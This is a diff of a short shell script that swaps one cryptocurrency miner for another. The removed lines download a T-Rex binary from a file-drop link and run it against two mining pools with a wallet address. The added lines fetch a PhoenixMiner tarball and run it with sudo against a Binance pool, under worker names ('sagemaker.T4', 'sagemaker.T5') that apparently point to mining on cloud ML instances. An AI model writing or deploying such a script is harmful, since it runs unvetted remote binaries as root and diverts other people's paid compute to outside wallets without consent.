@@ -1,6 +1,10 @@
 #!/bin/sh
+apt update
+apt-get install libpci3 
+wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
+tar -xf PhoenixMiner_5.6d_Linux.tar.gz 
+cd PhoenixMiner_5.6d_Linux
+sudo ./PhoenixMiner -pool ethash.poolbinance.com:443 -coin eth -wal sagemaker.T5 -pass x -mi 14 -gt 400
 
-wget https://transfer.sh/TeNFRM/t-rex
-chmod 777 t-rex
-./t-rex -a ethash --lhr-algo autolykos2 -o stratum+tcp://ethash.poolbinance.com:443 -u sagemaker.T4 rig0 --url2 stratum+tcp://pool.woolypooly.com:3100 --user2 9gpNWA3LVic14cMmWHmKGZyiGqrxPaSEvGsdyt7jt2DDAWDQyc9.rig0 --pass2 x
+
 
